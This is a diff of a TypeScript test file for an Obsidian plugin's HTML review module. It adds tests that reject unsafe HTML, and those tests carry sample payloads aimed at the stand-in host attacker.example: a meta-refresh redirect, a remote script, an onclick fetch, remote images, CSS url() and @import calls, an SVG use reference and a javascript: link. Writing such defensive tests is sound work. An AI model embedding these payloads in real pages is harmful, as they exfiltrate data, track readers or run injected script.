@@ -4,8 +4,8 @@ import {
   createSymposiumDocument,
   createSymposiumReviewDocument,
   SYMPOSIUM_MAX_HTML_BYTES,
-  SymposiumDocumentRedirectError,
   SymposiumDocumentTooLargeError,
+  SymposiumDocumentUnsafeError,
 } from "@/symposium/symposiumDocument";
 import { App, Component, MarkdownRenderer, TFile } from "obsidian";
 
@@ -91,13 +91,13 @@ describe("symposiumDocument", () => {
     });
   });
 
-  describe("SymposiumDocumentRedirectError", () => {
+  describe("SymposiumDocumentUnsafeError", () => {
     describe("constructor()", () => {
-      it("describes automatic navigation as invalid finished HTML", () => {
-        const error = new SymposiumDocumentRedirectError();
+      it("describes active or remote content as invalid finished HTML", () => {
+        const error = new SymposiumDocumentUnsafeError();
 
         expect(error).toBeInstanceOf(Error);
-        expect(error.message).toBe("Symposium HTML must not contain automatic redirects.");
+        expect(error.message).toBe("Symposium HTML must be passive and self-contained.");
       });
     });
   });
@@ -126,8 +126,9 @@ describe("symposiumDocument", () => {
   });
 
   describe("createSymposiumReviewDocument()", () => {
-    it("returns the exact immutable document when no automatic redirect is present", () => {
-      const html = "<!doctype html><html><body>Review</body></html>";
+    it("returns exact immutable passive HTML with embedded styling and assets", () => {
+      const html =
+        '<!doctype html><html><head><style>body{color:#123}</style></head><body><a href="https://example.com">Source</a><img src="data:image/png;base64,iVBORw0KGgo="><svg><circle cx="1" cy="1" r="1"></circle></svg></body></html>';
 
       const result = createSymposiumReviewDocument("Review", html);
 
@@ -135,12 +136,27 @@ describe("symposiumDocument", () => {
       expect(Object.isFrozen(result)).toBe(true);
     });
 
-    it("rejects case-insensitive meta refresh navigation before review", () => {
-      const html =
-        '<!doctype html><html><head><meta content="0;url=https://attacker.example/leak" HTTP-EQUIV=" Refresh "></head></html>';
+    it.each([
+      [
+        "automatic redirects",
+        '<meta content="0;url=https://attacker.example/leak" HTTP-EQUIV=" Refresh ">',
+      ],
+      ["active elements", '<script src="https://attacker.example/run.js"></script>'],
+      ["event handlers", "<p onclick=\"fetch('https://attacker.example/')\">Review</p>"],
+      ["remote assets", '<img src="https://attacker.example/note.png">'],
+      ["executable links", '<a href="javascript:alert(1)">Review</a>'],
+      ["CSS resource URLs", "<style>body{background:url(https://attacker.example/pixel)}</style>"],
+      ["CSS imports", '<style>@import "//attacker.example/style.css";</style>'],
+      [
+        "SVG resource URLs",
+        '<svg><use href="https://attacker.example/icons.svg#note"></use></svg>',
+      ],
+      ["nested HTML documents", '<iframe srcdoc="<p>Hidden</p>"></iframe>'],
+    ])("rejects %s before review", (_case, body) => {
+      const html = `<!doctype html><html><body>${body}</body></html>`;
 
-      expect(() => createSymposiumReviewDocument("Redirect", html)).toThrow(
-        SymposiumDocumentRedirectError
+      expect(() => createSymposiumReviewDocument("Unsafe", html)).toThrow(
+        SymposiumDocumentUnsafeError
       );
     });
   });
